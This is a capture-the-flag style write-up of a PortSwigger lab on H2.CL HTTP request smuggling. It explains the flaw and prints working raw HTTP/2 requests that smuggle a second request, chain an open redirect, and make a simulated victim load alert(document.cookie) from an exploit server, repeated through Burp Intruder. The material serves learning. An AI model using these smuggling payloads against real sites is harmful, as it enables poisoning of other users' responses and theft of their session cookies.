---
title: " PortSwiggerlabs: H2.CL request smuggling"
date: 2026-07-07 00:00:00 +0000
categories: [PortSwiggerLabs , HTTP Request Smuggling ]
tags: [PortSwiggerLabs , HTTP Request Smuggling , Challenge , Web_Attacks ]
---


## Information :

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds.


## Solution : 

**Quick note:**

HTTP Request Smuggling happens because of a disagreement between servers. In a typical setup you have a front-end (proxy, load balancer, CDN) forwarding requests to a back-end, and they share persistent TCP connections. The issue is that HTTP gives two ways to tell a server where a request body ends: Content-Length, which just counts bytes, and Transfer-Encoding: chunked, which sends the body in chunks ending with a zero-size chunk. When both headers are present in the same request, different servers may prioritize differently and that gap is what we exploit.

The idea is: you craft a request the front-end considers complete and forwards normally, but the back-end reads it differently and treats part of your body as leftover data sitting in the TCP buffer. That leftover then gets prepended to the next incoming request — yours or another user's. That's how you end up bypassing access controls, hijacking requests, or poisoning responses.

The three main variants are CL.TE, TE.CL, and TE.TE , basically which server trusts which header, or in the TE.TE case, how you obfuscate the Transfer-Encoding header enough that one server just ignores it entirely.

Before jumping into Burp, two things worth knowing: first, disable Update Content-Length in Repeater options , if Burp auto corrects your Content-Length you're defeating the whole point. Second, make sure you're sending over HTTP/1, not HTTP/2. When testing manually, timing delays are your main signal if the response hangs after your crafted request, the back-end is likely waiting for data that isn't coming, which means it's parsing things differently from the front-end. That's your confirmation.


**H2.CL :**

Now sometimes the front end might be using HTTP2 but downgrades to HTTP/1.1 to communicate with the backend, this can also lead to a HTTP Request smuggling attack . 

- Since the essence of the attack is both front and backend are not agreeing on the mechanism to determine the CL . If the front end is re writing the request without verifying the content length that we provided , the front end and backend are vulnerable to request smuggling .
- The vulnerability here is that the front-end receives our full request via HTTP/2 framing, but when it downgrades to HTTP/1.1 it just blindly forwards the Content-Length we injected without recalculating it against the actual body size.
- The back-end trusts that CL, reads only that many bytes, and the rest sits in the buffer waiting for the next request.

Now back to the lab : 

<img width="1658" height="713" alt="image" src="https://github.com/user-attachments/assets/7d7dd1d6-1aea-4142-9f26-aea0bd9e18f0" />

First we need to detect the HE.CL , to do this :

- We keep HTTP2 this time .
- Remove the Update Content Length .
- Change Request Method .
- Get rid of unecessary Headers .
- Speficy our CL to be barely enough for the inital request to go through .
- Smuggle our 404 .
- Send a normal request after it and see if we get a 404 .

```bash
POST / HTTP/2
Host: 0a2e002903170c4d8599127400330088.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

abc
GET /404_Return HTTP/1.1
X-Ignore: x
```

<img width="1367" height="542" alt="image" src="https://github.com/user-attachments/assets/9fc38f77-4695-45ff-b264-15e5e82db654" />

No character line after x , since we want the normal request to be appended to it so that we don't get a 2 Request Method error .

Now if we send it , we should get a 404 : 

<img width="1536" height="512" alt="image" src="https://github.com/user-attachments/assets/c6f25fd3-1bba-4884-b196-04d0ca3291f2" />

Perfect this confirms it .

**Quick Note again :**

If we use new line character after the x , our request will be Invalid since it will have 2 GET Requests :

```bash
GET /404_Return HTTP/1.1
X-Ignore: x
GET / HTTP2 .... 
```

<img width="1294" height="460" alt="image" src="https://github.com/user-attachments/assets/fc44c2a2-31fd-49f6-b955-416af4df5e3d" />

So now if we send the normal request after this one , it will get appended but in a new line which will cause an error bcs the request is malformed . 

<img width="1340" height="568" alt="image" src="https://github.com/user-attachments/assets/00017c08-d561-4c3a-b7e5-4fb7e57d5519" />

Anyways back to the lab , now that we know there is a T2.CL , we can use this to poison the request of other users . 

To solve this lab , we need to redirect a user to our server , where js will be executed and once the document cookie is retrived we should be able to solve the lab.

Now for the redirection , we can use the onsite redirections that the website already performs , sometimes it might be misconfigured to allow for redirections outside :

- To test this , remove the file name as well as the / from the URL , maybe it will redirect us and we'll get a 302 :
- Pick any redirection from Burp's Sitemap and test with it :

<img width="1833" height="833" alt="image" src="https://github.com/user-attachments/assets/069c7bf2-ad93-4eae-9b72-b4bf8dee2f5e" />

Now if we remove the filename and the / : 

<img width="1300" height="488" alt="image" src="https://github.com/user-attachments/assets/472e5e0f-bafc-415e-8a12-be71d222eb5e" />

We got our redirection :)

Perfect now we can attempt the redirect to our Server : 

First we go back to our Attack Request :

- Instead of the 404 we specify the endpoint :
- We specify the host header to be something else :

Now we send our attack request : 

<img width="1311" height="538" alt="image" src="https://github.com/user-attachments/assets/30ae1bbe-fd14-4531-bb3d-a4aeaff26dc9" />

If we send a normal request now : 

<img width="1462" height="597" alt="image" src="https://github.com/user-attachments/assets/29c03594-1ce1-4051-9a4d-f873db916c09" />

We are redirected , but instead of the new server we specified we are redirected to the same old server , even though we specified a new Host .

This is just like the issue we had with double Host Headers , whenever we need to specify a new host header , it s better to put the content of the normal request that will be appended to the smuggled one inside the body of the smuggled request :

Otherwise it will look like this : 

```bash
POST / HTTP/2
Host: 0a2e002903170c4d8599127400330088.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

abc
GET /resources/js HTTP/1.1
Host : server_test.com
X-Ignore: GET / HTTP/2
Host: 0a2e002903170c4d8599127400330088.web-security-academy.net
```

Notice how there are 2 Host headers ? now to avoid all of this , put everything inside the smuggled request body : 

```bash
GET /resources/js HTTP/1.1
Host: server_test.com

x= GET / HTTP/2
Host: 0a2e002903170c4d8599127400330088.web-security-academy.net
```

<img width="1168" height="533" alt="image" src="https://github.com/user-attachments/assets/4afdf280-bed2-4b22-9853-e292297e8444" />

Of course since we got a body now , we need to specify both CL and Content type : 

```bash
POST / HTTP/2
Host: 0a2e002903170c4d8599127400330088.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

abc
GET /resources/js HTTP/1.1
Host: server_test.com
Content-Length: 4
Content-Type: application/x-www-form-urlencoded

x=
```

Now if we send a normal one after : 

<img width="1326" height="563" alt="image" src="https://github.com/user-attachments/assets/b1e28882-5d83-4b3d-af70-1b64c632f29e" />

Perfect , we are able to redirect to an external server . 

Now we can host a file on the Exploit server , and name it /exploit that will contain our payload : 

```js
alert(document.cookie)
```
<img width="1202" height="818" alt="image" src="https://github.com/user-attachments/assets/27696cee-0edb-40cd-af46-9f2b6b98fc36" />

Then we will redirect ourselves to it : 

Now we just send our attack Request : 

<img width="1379" height="584" alt="image" src="https://github.com/user-attachments/assets/e1fce819-13e7-4d93-93a0-7ee281c8d1ce" />

Then if we send a normal one right after , we should be redirected : 

<img width="1408" height="545" alt="image" src="https://github.com/user-attachments/assets/e97d1d63-756b-4c2e-80fd-1c576ba36db2" />

I tried using /exploit/ but this didn't work , so i decided to keep the same name as the file : 

<img width="1339" height="866" alt="image" src="https://github.com/user-attachments/assets/a3dd13e6-a41c-46b3-bc74-dc4571e55cb5" />

```bash
POST / HTTP/2
Host: 0a2e002903170c4d8599127400330088.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

abc
GET /resources/js HTTP/1.1
Host: exploit-0ab600ac03df0c8585c51166019100b2.exploit-server.net
Content-Length: 3
Content-Type: application/x-www-form-urlencoded

x=
```

Once we send the attack request , and we follow it up with a normal one : 

<img width="1283" height="588" alt="image" src="https://github.com/user-attachments/assets/381c4449-4f78-4eb2-b717-ea91f8c619e2" />

We are able to get our redirection . 

Now just like with our last lab , since it will be daunting to keep sending the attack request and following up with a normal one in hopes the victim browses the app at the perfect time . 

We will use Intruder to keep sending requests until the lab is solved :) 

<img width="1789" height="690" alt="image" src="https://github.com/user-attachments/assets/cb6bbfdc-7320-4f6e-bc44-6ca12de85bc2" />

Again , we need to make sure we disable the Auto update of CL, otherwise we're defying the whole point :

<img width="1857" height="664" alt="image" src="https://github.com/user-attachments/assets/d531bfa9-8850-4b45-a144-2f04386ca689" />

Now we keep going until we get two successive 200 responses , that means our attack request was intercepted by the victim like we planned :)

<img width="1247" height="747" alt="image" src="https://github.com/user-attachments/assets/0d52562a-a9a6-44fd-a6b3-4e76c8a7d128" />

And we do , now if we go back to the lab , we will see that it was solved . 

<img width="1687" height="968" alt="image" src="https://github.com/user-attachments/assets/d882b435-4cbd-4e4c-bf79-ef201de78611" />

That was all for this lab, see you in the next one :)
